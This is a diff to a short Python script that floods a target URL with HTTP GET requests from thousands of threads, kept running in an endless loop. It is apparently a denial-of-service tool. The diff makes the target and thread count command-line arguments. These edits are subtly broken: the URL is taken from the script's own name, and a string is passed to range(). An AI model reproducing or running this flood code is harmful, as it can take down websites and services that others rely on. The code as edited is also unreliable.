@@ -1,12 +1,12 @@
 import requests
 import random
 import threading
-import multiprocessing
+import sys
 
 VERSION='2.0'
 
 
-url=''
+url=sys.argv[0]
 socket_ip=[]
 user_agent=[]
 request_counters=0
@@ -23,11 +23,11 @@ def request_attack():
     requests.get(url)
     
 def send():
-    for i in range(6000):
+    for i in range(sys.argv[1]):
         get_attack=threading.Thread(target=request_attack)
         get_attack.start()
     while True:
-        if threading.active_count() < 6000:
+        if threading.active_count() < sys.argv[1]:
             get_attack=threading.Thread(target=request_attack)
             get_attack.start()
 
